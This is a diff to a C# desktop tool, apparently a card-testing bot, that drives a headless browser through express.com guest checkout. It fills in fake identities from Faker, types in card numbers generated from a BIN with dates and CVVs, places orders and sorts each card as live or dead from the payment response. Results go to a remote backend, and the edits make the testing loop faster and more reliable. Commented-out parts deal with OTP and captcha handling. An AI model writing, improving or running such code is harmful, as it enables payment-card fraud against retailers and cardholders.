@@ -26,8 +26,8 @@ namespace Asgard
 {
     public partial class Balder : Form, IForm
     {
-        public new IClans Owner { get; set; }
-
+        public new IAesir Owner { get; set; }
+        public new IChecker OChecker { get; set; }
         private string Bin { set; get; }
         private string Quatity { set; get; }
         private string Email { set; get; }
@@ -66,8 +66,8 @@ namespace Asgard
         private static ChromiumWebBrowser browser2;
 
         private static IFrame frame;
-
-        private const string initialUrl = "https://www.express.com";
+        private const string web = "www.express.com";
+        private const string initialUrl = "https://" + web;
 
         #region LastInitUrl
         private static readonly string[] middleInitialUrl = new[] {
@@ -111,6 +111,9 @@ namespace Asgard
         SoundPlayer Valhalla;
         SoundPlayer Valkyrie;
 
+        private double OriginalCreditCardsCount;
+        private bool Stop = false;
+
         public Balder()
         {
             InitializeComponent();
@@ -127,11 +130,12 @@ namespace Asgard
         //TO-DO, deberia enceder solo en ejecucion del gate.
         public void InitializeParameters(params object[] parameters)
         {
-            if (parameters.Length == 3)
+            if (parameters.Length == 4)
             {
                 UserId = (int)parameters[0];
                 Token = parameters[1].ToString();
                 Owner = (Aesir)parameters[2];
+                OChecker = (Checker)parameters[3];
             }
         }
 
@@ -165,7 +169,7 @@ namespace Asgard
             PanelConfirm.Hide();
             if (browser != null)
             {
-                await browser.Kill("www.express.com");
+                await browser.Kill(web);
             }
             this.Close();
         }
@@ -234,19 +238,19 @@ namespace Asgard
         {
             Rectangle borderTextBoxBin = new Rectangle(TextBoxBin.Location.X, TextBoxBin.Location.Y, TextBoxBin.ClientSize.Width, TextBoxBin.ClientSize.Height);
             borderTextBoxBin.Inflate(1, 1);
-            ControlPaint.DrawBorder(e.Graphics, borderTextBoxBin, Color.Black, ButtonBorderStyle.Solid);
+            ControlPaint.DrawBorder(e.Graphics, borderTextBoxBin, Color.White, ButtonBorderStyle.Solid);
 
             Rectangle borderMaskedTextBoxDate = new Rectangle(MaskedTextBoxDate.Location.X, MaskedTextBoxDate.Location.Y, MaskedTextBoxDate.ClientSize.Width, MaskedTextBoxDate.ClientSize.Height);
             borderMaskedTextBoxDate.Inflate(1, 1);
-            ControlPaint.DrawBorder(e.Graphics, borderMaskedTextBoxDate, Color.Black, ButtonBorderStyle.Solid);
+            ControlPaint.DrawBorder(e.Graphics, borderMaskedTextBoxDate, Color.White, ButtonBorderStyle.Solid);
 
             Rectangle borderTextBoxCvv = new Rectangle(TextBoxCvv.Location.X, TextBoxCvv.Location.Y, TextBoxCvv.ClientSize.Width, TextBoxCvv.ClientSize.Height);
             borderTextBoxCvv.Inflate(1, 1);
-            ControlPaint.DrawBorder(e.Graphics, borderTextBoxCvv, Color.Black, ButtonBorderStyle.Solid);
+            ControlPaint.DrawBorder(e.Graphics, borderTextBoxCvv, Color.White, ButtonBorderStyle.Solid);
 
             Rectangle borderTextBoxQuantity = new Rectangle(TextBoxQuantity.Location.X, TextBoxQuantity.Location.Y, TextBoxQuantity.ClientSize.Width, TextBoxQuantity.ClientSize.Height);
             borderTextBoxQuantity.Inflate(1, 1);
-            ControlPaint.DrawBorder(e.Graphics, borderTextBoxQuantity, Color.Black, ButtonBorderStyle.Solid);
+            ControlPaint.DrawBorder(e.Graphics, borderTextBoxQuantity, Color.White, ButtonBorderStyle.Solid);
         }
         #endregion
 
@@ -734,7 +738,7 @@ namespace Asgard
         {
             try
             {
-                LabelInfoGeneralConsole.ForeColor = Color.Black;
+                LabelInfoGeneralConsole.ForeColor = Color.White;
                 int delay = 100;
                 if (status == "Success")
                 {
@@ -763,7 +767,7 @@ namespace Asgard
         {
             try
             {
-                LabelInfoGeneralConsole.ForeColor = Color.Black;
+                LabelInfoGeneralConsole.ForeColor = Color.White;
                 int delay = 10;
                 if (status == "Success")
                 {
@@ -905,7 +909,7 @@ namespace Asgard
         {
             Rectangle borderTextBoxCreditCards = new Rectangle(TextBoxCreditCards.Location.X, TextBoxCreditCards.Location.Y, TextBoxCreditCards.ClientSize.Width + 17, TextBoxCreditCards.ClientSize.Height);
             borderTextBoxCreditCards.Inflate(1, 1);
-            ControlPaint.DrawBorder(e.Graphics, borderTextBoxCreditCards, Color.Black, ButtonBorderStyle.Solid);
+            ControlPaint.DrawBorder(e.Graphics, borderTextBoxCreditCards, Color.White, ButtonBorderStyle.Solid);
         }
         #endregion
 
@@ -1012,6 +1016,7 @@ namespace Asgard
                 IconButtonStop.Enabled = true;
                 running = true;
                 //Task.Run(() => InvokeHermoor());
+                OriginalCreditCardsCount = CreditCards.Count;
                 await InvokeBalder();
                 await ConsoleProgressGeneral("Balder finalizo Verificación.", 100, "Success");
                 await ConsoleProgressDetail("Balder finalizo Verificación.", 100, "Success");
@@ -1033,7 +1038,7 @@ namespace Asgard
         {
             Rectangle borderTextBoxValhalla = new Rectangle(TextBoxValhalla.Location.X, TextBoxValhalla.Location.Y, TextBoxValhalla.ClientSize.Width + 17, TextBoxValhalla.ClientSize.Height);
             borderTextBoxValhalla.Inflate(1, 1); // border thickness
-            ControlPaint.DrawBorder(e.Graphics, borderTextBoxValhalla, Color.Black, ButtonBorderStyle.Solid);
+            ControlPaint.DrawBorder(e.Graphics, borderTextBoxValhalla, Color.White, ButtonBorderStyle.Solid);
         }
         #endregion
         #region Contols Events
@@ -1095,7 +1100,7 @@ namespace Asgard
         {
             Rectangle borderTextBoxHelheim = new Rectangle(TextBoxHelheim.Location.X, TextBoxHelheim.Location.Y, TextBoxHelheim.ClientSize.Width + 17, TextBoxHelheim.ClientSize.Height);
             borderTextBoxHelheim.Inflate(1, 1); // border thickness
-            ControlPaint.DrawBorder(e.Graphics, borderTextBoxHelheim, Color.Black, ButtonBorderStyle.Solid);
+            ControlPaint.DrawBorder(e.Graphics, borderTextBoxHelheim, Color.White, ButtonBorderStyle.Solid);
         }
         #endregion
 
@@ -1185,7 +1190,7 @@ namespace Asgard
                                  CreditCards[i].Add(GetDate()[0]);
                                  CreditCards[i].Add(GetDate()[1]);
                                  CreditCards[i].Add(GetCvv());
-                                 await Task.Delay(50);
+                                 //await Task.Delay(50);
                                  if (IconButtonGenerarStopClick)
                                  {
                                      IconButtonGenerarStopClick = false;
@@ -1356,7 +1361,7 @@ namespace Asgard
         {
             Rectangle borderTextBoxValkyrie = new Rectangle(TextBoxValkyrie.Location.X, TextBoxValkyrie.Location.Y, TextBoxValkyrie.ClientSize.Width + 17, TextBoxValkyrie.ClientSize.Height);
             borderTextBoxValkyrie.Inflate(1, 1); // border thickness
-            ControlPaint.DrawBorder(e.Graphics, borderTextBoxValkyrie, Color.Black, ButtonBorderStyle.Solid);
+            ControlPaint.DrawBorder(e.Graphics, borderTextBoxValkyrie, Color.White, ButtonBorderStyle.Solid);
         }
         #endregion
 
@@ -1474,7 +1479,7 @@ namespace Asgard
         {
             Rectangle borderTextBoxValkyrieLive = new Rectangle(TextBoxValkyrieLive.Location.X, TextBoxValkyrieLive.Location.Y, TextBoxValkyrieLive.ClientSize.Width + 17, TextBoxValkyrieLive.ClientSize.Height);
             borderTextBoxValkyrieLive.Inflate(1, 1); // border thickness
-            ControlPaint.DrawBorder(e.Graphics, borderTextBoxValkyrieLive, Color.Black, ButtonBorderStyle.Solid);
+            ControlPaint.DrawBorder(e.Graphics, borderTextBoxValkyrieLive, Color.White, ButtonBorderStyle.Solid);
         }
         #endregion
 
@@ -1573,7 +1578,7 @@ namespace Asgard
         {
             Rectangle borderTextBoxValkyrieDie = new Rectangle(TextBoxValkyrieDie.Location.X, TextBoxValkyrieDie.Location.Y, TextBoxValkyrieDie.ClientSize.Width + 17, TextBoxValkyrieDie.ClientSize.Height);
             borderTextBoxValkyrieDie.Inflate(1, 1); // border thickness
-            ControlPaint.DrawBorder(e.Graphics, borderTextBoxValkyrieDie, Color.Black, ButtonBorderStyle.Solid);
+            ControlPaint.DrawBorder(e.Graphics, borderTextBoxValkyrieDie, Color.White, ButtonBorderStyle.Solid);
         }
         #endregion
 
@@ -1660,7 +1665,7 @@ namespace Asgard
                         double progress = Convert.ToDouble((x + 1) * 100 / valkyriesCount);
                         await ConsoleProgressGeneral("Balder llamando a Valquirias.", (int)Math.Round(progress));
                     }
-                    await Task.Delay(50);
+                    //await Task.Delay(50);
                     x++;
 
                 }
@@ -1755,7 +1760,7 @@ namespace Asgard
                     {
                         listValkyries = string.Empty;
                     }
-                    await Task.Delay(50);
+                    //await Task.Delay(50);
                 }
                 TextBoxValkyrie.Text = listValkyries;
             }
@@ -1795,8 +1800,8 @@ namespace Asgard
             }
             catch (Exception) { }
 
-            await browser.Kill("www.express.com");
             await tokenCancel.Kill();
+            await browser.Kill(web);
 
             if (balder)
             {
@@ -1808,37 +1813,21 @@ namespace Asgard
             }
             else
             {
-                if (!running)
+                if (CreditCards.Count > 0)
                 {
-                    await ConsoleProgressGeneral("Balder fue detenido.", 0, "Fail");
-                    IconButtonGenerar.IconColor = IconButtonGenerarIconColor;
-                    IconButtonGenerar.Enabled = IconButtonGenerarEnabled;
-                    IconButtonClear.IconColor = Color.Black;
-                    IconButtonClear.Enabled = true;
-                    IconButtonValkyrie.IconColor = Color.Black;
-                    IconButtonValkyrie.Enabled = true;
-                    if (CreditCards != null)
+                    if (!Stop)
                     {
-                        if (CreditCards.Count > 0)
-                        {
-                            IconButtonVerify.IconColor = Color.Black;
-                            IconButtonVerify.Enabled = true;
-
-                        }
-                        else
-                        {
-                            TextBoxCreditCards.Clear();
-                            IconButtonVerify.IconColor = Color.Black;
-                            IconButtonVerify.Enabled = false;
-                        }
+                        await ConsoleProgressGeneral("Balder requiere un sacrificio.", 0, "Fail");
+                        await ConsoleProgressGeneral("Ofreciendo un sacrificio a Balder.", 0, "Success");
+                        await InvokeBalder();
                     }
-                }
-
-                else if (CreditCards.Count > 0)
-                {
-                    await ConsoleProgressGeneral("Balder requiere un sacrificio.", 0, "Fail");
-                    await ConsoleProgressGeneral("Ofreciendo un sacrificio a Balder.", 0, "Success");
-                    await InvokeBalder();
+                    else
+                    {
+                        await Task.Delay(2000);
+                        await ConsoleProgressDetail("", 0);
+                        await ConsoleProgressGeneral("BALDER DIOS DE LA PAZ.", 0);
+                        Stop = false;
+                    }
 
                 }
                 else
@@ -1847,8 +1836,8 @@ namespace Asgard
                 }
             }
             await Task.Delay(2000);
-            await ConsoleProgressGeneral("BALDER DIOS DE LA PAZ.", 0);
             await ConsoleProgressDetail("", 0);
+            await ConsoleProgressGeneral("BALDER DIOS DE LA PAZ.", 0);
         }
 
         private async Task<bool> LoadBrowser()
@@ -1932,7 +1921,7 @@ namespace Asgard
             bool item = false;
             try
             {
-                //await //await browser.Screenshot("1.Item");
+                await browser.Screenshot("1.Item");
                 await ConsoleProgressGeneral("Estableciendo registro de regalos.", 10);
                 await browser.DisableAlerts();
                 string clickItemInStock = @"let allItems = document.querySelectorAll('#app > div > div > div > div:nth-child(2) > div:nth-child(2) > div > div > div:nth-child(2) > a:nth-child(2)');
@@ -1963,7 +1952,7 @@ namespace Asgard
         {
             try
             {
-                //await browser.Screenshot("2.SelectSize");
+                await browser.Screenshot("2.SelectSize");
                 await ConsoleProgressGeneral("Reajustando peso emocional.", 15);
                 await browser.DisableAlerts();
                 string clickRandomSize = @"let allSizes = document.querySelectorAll('#content > div > div > section > section.grid--direction-row.grid--justify-start.grid--wrap.grid__column.grid__col-md-4.grid__col-sm-12.grid--order-3 > section > div:nth-child(7) > div > div > button');
@@ -1997,7 +1986,7 @@ namespace Asgard
         {
             try
             {
-                //await browser.Screenshot("3.SelectLength");
+                await browser.Screenshot("3.SelectLength");
                 await ConsoleProgressGeneral("Calculando tasa de cambio.", 20);
                 await browser.DisableAlerts();
                 string clickItemInStock = @"let allLengths = document.querySelectorAll('#content > div > div > section > section.grid--direction-row.grid--justify-start.grid--wrap.grid__column.grid__col-md-4.grid__col-sm-12.grid--order-3 > section > div:nth-child(7) > div > div > button');
@@ -2021,7 +2010,7 @@ namespace Asgard
         {
             try
             {
-                //await browser.Screenshot("4.AddToBag");
+                await browser.Screenshot("4.AddToBag");
                 await ConsoleProgressGeneral("Activando umbral de desviación.", 25);
                 await browser.DisableAlerts();
                 string clickAddToBag = @"document.querySelector('#content > div > div > section > section.grid--direction-row.grid--justify-start.grid--wrap.grid__column.grid__col-md-4.grid__col-sm-12.grid--order-3 > section > button').click();";
@@ -2042,7 +2031,7 @@ namespace Asgard
         {
             try
             {
-                //await browser.Screenshot("5.GoToBag");
+                await browser.Screenshot("5.GoToBag");
                 await ConsoleProgressGeneral("Requisando donaciones del alumnado.", 30);
                 browser.Load("https://www.express.com/bag");
                 await browser.DisableAlerts();
@@ -2062,7 +2051,7 @@ namespace Asgard
         {
             try
             {
-                //await browser.Screenshot("6.ContinueToCheckout");
+                await browser.Screenshot("6.ContinueToCheckout");
                 await ConsoleProgressGeneral("Saborizando segundos platos.", 35);
                 await browser.DisableAlerts();
                 await browser.ExecuteScript("document.querySelector('#continue-to-checkout').click()");
@@ -2084,7 +2073,7 @@ namespace Asgard
         {
             try
             {
-                //await browser.Screenshot("7.CheckoutAsGuest");
+                await browser.Screenshot("7.CheckoutAsGuest");
                 await ConsoleProgressGeneral("Concienciando de que \"somos una piña\".", 40);
                 await browser.DisableAlerts();
                 await browser.Click("section[name=loginFormContainer] > section > section:nth-child(2) > section > button");
@@ -2104,7 +2093,7 @@ namespace Asgard
         {
             try
             {
-                //await browser.Screenshot("8.ContactInformation");
+                await browser.Screenshot("8.ContactInformation");
                 await ConsoleProgressGeneral("Prediciendo prevalencia de los charcos.", 45);
                 await browser.DisableAlerts();
                 string email = Faker.Internet.Email();
@@ -2137,14 +2126,18 @@ namespace Asgard
         {
             try
             {
-                //await browser.Screenshot("9.ShippingBillingAddress");
+                await browser.Screenshot("9.ShippingBillingAddress");
                 await ConsoleProgressGeneral("Iniciando intrigas viles.", 50);
                 await browser.DisableAlerts();
                 string email = Faker.Internet.Email();
                 await browser.SendKeys("#shippingAndBillingForm > div:nth-child(1) > div:nth-child(1) > div > div:nth-child(4) > div > div > input", Faker.Address.StreetAddress());
                 await Task.Delay(500);
-                await browser.SendKeys("#shippingAndBillingForm > div:nth-child(1) > div:nth-child(1) > div > div:nth-child(5) > div > input[type=text]", Faker.Address.SecondaryAddress());
-                await Task.Delay(500);
+                if (new Random().Next(0, 2) == 0)
+                {
+                    await browser.SendKeys("#shippingAndBillingForm > div:nth-child(1) > div:nth-child(1) > div > div:nth-child(5) > div > input[type=text]", Faker.Address.SecondaryAddress());
+                    await Task.Delay(500);
+                }
+
                 await browser.SendKeys("#shippingAndBillingForm > div:nth-child(1) > div:nth-child(1) > div > div:nth-child(6) > div > input[type=text]", Faker.Address.ZipCode());
                 await Task.Delay(500);
                 await browser.SendKeys("#shippingAndBillingForm > div:nth-child(1) > div:nth-child(1) > div > div:nth-child(7) > div > input[type=text]", Faker.Address.City());
@@ -2157,6 +2150,7 @@ namespace Asgard
                 await browser.ExecuteScript("document.querySelector('#shippingAndBillingForm > div:nth-child(3) > button').click()");
             }
             catch (Exception) { }
+            await browser.Screenshot("9.1.ShippingBillingAddressFill");
             //#shippingAndBillingForm > div:nth-child(3) > button
             bool buttonDeliveryOptions = await browser.ElementVisible("#delivery-and-pickup > div > div:nth-child(2) > button", "ExceptionShippingBillingAddress");
             if (buttonDeliveryOptions)
@@ -2171,7 +2165,7 @@ namespace Asgard
         {
             try
             {
-                //await browser.Screenshot("10.DeliveryOptions");
+                await browser.Screenshot("10.DeliveryOptions");
                 await ConsoleProgressGeneral("Escribiendo textos del arranque.", 55);
                 await browser.DisableAlerts();
                 await browser.ExecuteScript("document.querySelector('#delivery-and-pickup > div > div:nth-child(2) > button').click()");
@@ -2181,7 +2175,7 @@ namespace Asgard
             bool inputCreditCard = await browser.ElementVisible("#creditCardNumberInput", "ExceptionShippingBillingAddress");
             if (inputCreditCard)
             {
-                ////await browser.Screenshot("11.Last");
+                await browser.Screenshot("11.Last");
                 return await Last();
             }
             await ConsoleProgressGeneral("Escribiendo textos del arranque. ¡Fallo! ", 55, "Fail");
@@ -2196,7 +2190,7 @@ namespace Asgard
         //    {
         //        try
         //        {
-        //            //////await browser.Screenshot("6.SetOTP");
+        //            await browser.Screenshot("6.SetOTP");
         //            await ConsoleProgressGeneral("Iniciando intrigas viles.", 50);
         //            await browser.SendKeys("input[name=code]", EmailOTP);
         //            await browser.Click("#a-autoid-0");
@@ -2219,7 +2213,7 @@ namespace Asgard
         //{
         //    try
         //    {
-        //        //////await browser.Screenshot("7.ChangeEmail");
+        //        await browser.Screenshot("7.ChangeEmail");
         //        await ConsoleProgressGeneral("Escribiendo textos del arranque.", 55);
         //        await browser.Click("a.a-link-normal.cvf-widget-link-claim-change");
         //    }
@@ -2241,7 +2235,7 @@ namespace Asgard
         //    {
         //        try
         //        {
-        //            //////await browser.Screenshot("8.Phone");
+        //            await browser.Screenshot("8.Phone");
         //            await ConsoleProgressGeneral("Preparando pitos y flautas.", 60);
         //            PanelPhone.Show();
         //            await IconButtonPhone.OnClickAsync();
@@ -2284,7 +2278,7 @@ namespace Asgard
         //{
         //    try
         //    {
-        //        //////await browser.Screenshot("10.PhoneOTP");
+        //        await browser.Screenshot("10.PhoneOTP");
         //        await ConsoleProgressGeneral("Generando Algoritmo de cotorreo.", 65);
         //        PanelOTP.Show();
         //        await IconButtonOTP.OnClickAsync();
@@ -2306,7 +2300,7 @@ namespace Asgard
         //    bool inputAccountHolderName = await browser.ElementVisible("input[name=ppw-accountHolderName]", "ExceptionPhoneOTP");
         //    if (inputAccountHolderName)
         //    {
-        //        //////await browser.Screenshot("11.Algo");
+        //        await browser.Screenshot("11.Algo");
         //        //return true;
         //    }
         //    else
@@ -2335,7 +2329,7 @@ namespace Asgard
         //    {
         //        try
         //        {
-        //            //////await browser.Screenshot("11.SignIn");
+        //            await browser.Screenshot("11.SignIn");
         //            await ConsoleProgressGeneral("Incremento de las conductas laborales.", 70);
         //            await browser.SendKeys("#ap_password", Password);
         //            await browser.Click("#signInSubmit");
@@ -2384,7 +2378,7 @@ namespace Asgard
         //            }
 
         //            await Task.Delay(10000);
-        //            //////await browser.Screenshot("16.resolveCaptcha2");
+        //            await browser.Screenshot("16.resolveCaptcha2");
         //            await browser.GetSource();
         //        }
         //        await ConsoleProgressGeneral("Incremento de las conductas laborales. ¡Fallo!", 70, "Fail");
@@ -2397,17 +2391,17 @@ namespace Asgard
         //{
         //    try
         //    {
-        //        //////await browser.Screenshot("12.resolveCaptcha2");
+        //        await browser.Screenshot("12.resolveCaptcha2");
         //        await ConsoleProgressGeneral("Prediciendo prevalencia de los charcos.", 75);
         //        await browser.SendKeys("#ap_password", Password);
-        //        //////await browser.Screenshot("13.resolveCaptcha2");
+        //        await browser.Screenshot("13.resolveCaptcha2");
         //        await browser.SendKeys("#auth-captcha-guess", textCaptchaResolve2);
-        //        //////await browser.Screenshot("14.resolveCaptcha2");
+        //        await browser.Screenshot("14.resolveCaptcha2");
         //        string clickSignIn = "document.querySelector('#signInSubmit').click();";
         //        await browser.ExecuteScript(clickSignIn);
         //    }
         //    catch (Exception) { }
-        //    //////await browser.Screenshot("15.resolveCaptcha2");
+        //    await browser.Screenshot("15.resolveCaptcha2");
         //}
         #endregion
 
@@ -2415,7 +2409,7 @@ namespace Asgard
         {
             try
             {
-                //await browser.Screenshot("11.Last");
+                await browser.Screenshot("11.Last");
                 await ConsoleProgressGeneral("Preparando pitos y flautas.", 60);
                 await browser.DisableAlerts();
                 string listLiveCreditCard = string.Empty;
@@ -2425,7 +2419,8 @@ namespace Asgard
                     LiveCreditCards = new List<List<string>>();
                     DieCreditCards = new List<List<string>>();
                     int creditCardsCount = CreditCards.Count;
-                    int x = 0;
+                    double x = 60;
+                    int n = 0;
                     for (int i = 0; i < creditCardsCount;)
                     {
                         await ConsoleProgressDetail("Generando Algoritmo de cotorreo.", 0);
@@ -2440,62 +2435,72 @@ namespace Asgard
                             bool forseti = await Forseti();
                             if (forseti)
                             {
-                                //await browser.Screenshot(x.ToString() + ".Valhalla_" + number);
-                                await ConsoleProgressDetail(number, 100, "Success");
+                                await browser.Screenshot(x.ToString() + ".Valhalla_" + number);
+                                await ConsoleProgressDetail(string.Join("|", CreditCards[i].ToArray()), 100);
                                 if (TextBoxValhalla.Text == string.Empty)
                                 {
                                     listLiveCreditCard += string.Join("|", CreditCards[i].ToArray());
-                                    await Asatru.SetValhalla(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray()));
+                                    // await Asatru.SetValhalla(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray()));
                                 }
                                 else
                                 {
                                     listLiveCreditCard = TextBoxValhalla.Text;
                                     listLiveCreditCard += "\r\n" + string.Join("|", CreditCards[i].ToArray());
-                                    await Asatru.SetValhalla(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray()));
+                                    // await Asatru.SetValhalla(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray()));
                                 }
-                                ReduceListCreditCards();
+
+                                IEnumerable<Task> tasks = new Task[] {
+                                    Asatru.SetValhalla(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray())),
+                                    ReduceListCreditCards(),
+                                    OChecker.SetLabelGetRunes(),
+                                    Block()
+                                };
+                                await Task.WhenAll(tasks); // good
+
                                 TextBoxValhalla.Text = listLiveCreditCard;
-                                double progress = Convert.ToDouble((x + 1) * 100 / creditCardsCount);
-                                await ConsoleProgressGeneral("Incremento de las conductas laborales.", (int)Math.Round(progress));
-                                await Task.Delay(100);
-                                x++;
+
+                                x += CalcIncrementX(40);
+                                await ConsoleProgressGeneral("Incremento de las conductas laborales.", (int)Math.Round(x));
+                                //await Task.Delay(100);
+                                //  x++;
                                 return false;
                             }
                             else
                             {
                                 if (!forsetiError)
                                 {
-                                    //await browser.Screenshot(x.ToString() + ".Helheim_" + number);
-                                    await ConsoleProgressDetail(number, 100, "Fail");
+                                    await browser.Screenshot(x.ToString() + ".Helheim_" + number);
+                                    await ConsoleProgressDetail(string.Join("|", CreditCards[i].ToArray()), 100);
                                     if (TextBoxHelheim.Text == string.Empty)
                                     {
                                         listDieCreditCard += string.Join("|", CreditCards[i].ToArray());
-                                        await Asatru.SetHelheim(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray()));
+                                        //        await Asatru.SetHelheim(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray()));
                                     }
                                     else
                                     {
                                         listDieCreditCard = TextBoxHelheim.Text;
                                         listDieCreditCard += "\r\n" + string.Join("|", CreditCards[i].ToArray());
-                                        await Asatru.SetHelheim(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray()));
+                                        //      await Asatru.SetHelheim(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray()));
                                     }
-                                    ReduceListCreditCards();
+                                    await Task.WhenAll(Asatru.SetHelheim(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray())), ReduceListCreditCards()); //good
                                     TextBoxHelheim.Text = listDieCreditCard;
-                                    double progress = Convert.ToDouble((x + 1) * 100 / creditCardsCount);
-                                    await ConsoleProgressGeneral("Incremento de las conductas laborales.", (int)Math.Round(progress));
-                                    await Task.Delay(100);
-                                    x++;
-                                    if (x == 18)
+                                    x += CalcIncrementX(40);
+                                    await ConsoleProgressGeneral("Incremento de las conductas laborales.", (int)Math.Round(x));
+                                    //await Task.Delay(100);
+                                    //    x++;
+                                    n++;
+                                    if (n < 15)
                                     {
-                                        return false;
+                                        continue;
                                     }
                                     else
                                     {
-                                        continue;
+                                        return false;
                                     }
                                 }
                                 else
                                 {
-                                    forsetiError = true;
+                                    forsetiError = false;
                                     return false;
                                 }
                             }
@@ -2519,7 +2524,7 @@ namespace Asgard
         #endregion
 
         #region Methods
-        private async void ReduceListCreditCards()
+        private async Task ReduceListCreditCards()
         {
             try
             {
@@ -2543,7 +2548,7 @@ namespace Asgard
                     {
                         listCreditCard = string.Empty;
                     }
-                    await Task.Delay(100);
+                    //await Task.Delay(100);
                 }
                 TextBoxCreditCards.Text = listCreditCard;
             }
@@ -2554,16 +2559,16 @@ namespace Asgard
         {
             try
             {
-                await Task.Delay(5000);
-                //await browser.Screenshot("12.Card");
+                //  await Task.Delay(5000);
+                await browser.Screenshot("12.Card");
                 await ConsoleProgressDetail("Prediciendo prevalencia de los charcos.", 20);
                 await browser.DisableAlerts();
                 await browser.SendKeys("#creditCardNumberInput", number);
-                await Task.Delay(500);
 
+                await Task.Delay(500);
                 await browser.Click("#credit-card-list > span > li > div > div > div > span > div:nth-child(1) > div:nth-child(1) > div > select");
-                string selectMonth = $"let months = document.querySelectorAll('#credit-card-list > span > li > div > div > div > span > div:nth-child(1) > div:nth-child(1) > div > select > option');" +
-                    "for (let month of months)" +
+                string selectMonth = $"var months = document.querySelectorAll('#credit-card-list > span > li > div > div > div > span > div:nth-child(1) > div:nth-child(1) > div > select > option');" +
+                    "for (var month of months)" +
                         "{" +
                             $"if (month.value == '{month}')" +
                             "{" +
@@ -2571,10 +2576,11 @@ namespace Asgard
                             "}" +
                         "}";
                 await browser.ExecuteScript(selectMonth);
+
                 await Task.Delay(500);
                 await browser.Click("#credit-card-list > span > li > div > div > div > span > div:nth-child(1) > div:nth-child(2) > div > select");
-                string selectYear = $"let years = document.querySelectorAll('#credit-card-list > span > li > div > div > div > span > div:nth-child(1) > div:nth-child(2) > div > select > option');" +
-                    "for (let year of years)" +
+                string selectYear = $"var years = document.querySelectorAll('#credit-card-list > span > li > div > div > div > span > div:nth-child(1) > div:nth-child(2) > div > select > option');" +
+                    "for (var year of years)" +
                     "{" +
                         $"if (year.value == '{year}')" +
                         "{" +
@@ -2585,11 +2591,11 @@ namespace Asgard
                 await Task.Delay(500);
                 await browser.SendKeys("#credit-card-list > span > li > div > div > div > span > div:nth-child(2) > div:nth-child(1) > div > div > input[type=text]", cvv);
                 await Task.Delay(1000);
-                ////await browser.Screenshot("13.FillCC");
+                await browser.Screenshot("13.FillCC");
                 string buttonPlaceOrder = "document.querySelector('#payment > div > form > section > section > div > button').click();";
                 await browser.ExecuteScript(buttonPlaceOrder);
                 // await Task.Delay(10000);
-                ////await browser.Screenshot("14.FillCC-Diemessage");
+                await browser.Screenshot("14.FillCC-Diemessage");
                 //return true;
             }
             catch (Exception) { }
@@ -2614,12 +2620,15 @@ namespace Asgard
         {
             try
             {
-                //////await browser.Screenshot("11.LatestData");
+                await browser.Screenshot("11.LatestData");
                 await ConsoleProgressDetail("Insuflando furia subatómica.", 40);
 
                 bool hellheim = await browser.ElementInnerTextContent("#payment > div > div:nth-child(1) > div > section > section > div", "Please try again.", "ExceptionForsetiHellheim");
                 if (hellheim)
                 {
+                    //await browser.GetSource("paymentDie");
+                    //string removeDivNotification = "document.querySelector('#payment > div > div:nth-child(1) > div > section > section > div').textContent = '';";
+
                     if (await ClearPayment())
                     {
                         return false;
@@ -2644,22 +2653,46 @@ namespace Asgard
         {
             try
             {
-                await ConsoleProgressDetail("Insuflando furia subatómica.", 80);
-                browser.Reload();
-                await Task.Delay(5000);
-                //await browser.ExecuteScript("var child = document.querySelector('div.notification'); child.parentNode.removeChild(child);");
-                ////await browser.ClickXY(420, 165);
-                //await browser.Click("#creditCardNumberInput");
-                //for (int i = 0; i < 19; i++)
-                //{
-                //    await browser.SendKeyCode(0x08);
-                //}
+                string removeDivNotification = "document.querySelector('#payment > div > div:nth-child(1) > div').remove;";
+                await browser.ExecuteScript(removeDivNotification);
+
+                await browser.Click("#creditCardNumberInput");
+                for (int i = 0; i < 19; i++)
+                {
+                    await browser.SendKeyCode(0x08);
+                }
+
+                //await browser.Click("#credit-card-list > span > li > div > div > div > span > div:nth-child(1) > div:nth-child(1) > div > select");
+                //string deselectMonth = $"var dmonths = document.querySelectorAll('#credit-card-list > span > li > div > div > div > span > div:nth-child(1) > div:nth-child(1) > div > select > option');" +
+                //    "for (var dmonth of dmonths)" +
+                //        "{" +
+                //            "if (dmonth.index == 0)" +
+                //            "{" +
+                //                "dmonth.setAttribute('selected','true');" +
+                //            "}" +
+                //        "}";
+                //await browser.ExecuteScript(deselectMonth, true);
                 //await Task.Delay(500);
-                //await browser.Click("#credit-card-list > span > li > div > div > div > span > div:nth-child(2) > div:nth-child(1) > div > div > input[type=text]");
-                //for (int i = 0; i < 5; i++)
-                //{
-                //    await browser.SendKeyCode(0x08);
-                //}
+                //await browser.Click("#credit-card-list > span > li > div > div > div > span > div:nth-child(1) > div:nth-child(2) > div > select");
+                //string deselectYear = $"var dyears = document.querySelectorAll('#credit-card-list > span > li > div > div > div > span > div:nth-child(1) > div:nth-child(2) > div > select > option');" +
+                //    "for (var dyear of dyears)" +
+                //    "{" +
+                //        "if (dyear.index == 0)" +
+                //        "{" +
+                //            "dyear.setAttribute('selected','true');" +
+                //        "}" +
+                //    "}";
+                //await browser.ExecuteScript(deselectYear, true);
+                await Task.Delay(500);
+
+                await browser.Click("#credit-card-list > span > li > div > div > div > span > div:nth-child(2) > div:nth-child(1) > div > div > input[type=text]");
+                for (int i = 0; i < 5; i++)
+                {
+                    await browser.SendKeyCode(0x08);
+                }
+                await Task.Delay(500);
+                //await browser.Screenshot("paymentDie");
+
             }
             catch (Exception) { }
 
@@ -2672,6 +2705,17 @@ namespace Asgard
             {
                 return false;
             }
+        }
+
+        private double CalcIncrementX(double value)
+        {
+            try
+            {
+                double x = value / OriginalCreditCardsCount;
+                return x;
+            }
+            catch (Exception) { }
+            return 0;
         }
         #endregion
 
@@ -2697,7 +2741,7 @@ namespace Asgard
         //{
         //    Rectangle borderTextBoxCaptcha = new Rectangle(TextBoxCaptcha.Location.X, TextBoxCaptcha.Location.Y, TextBoxCaptcha.ClientSize.Width, TextBoxCaptcha.ClientSize.Height);
         //    borderTextBoxCaptcha.Inflate(1, 1);
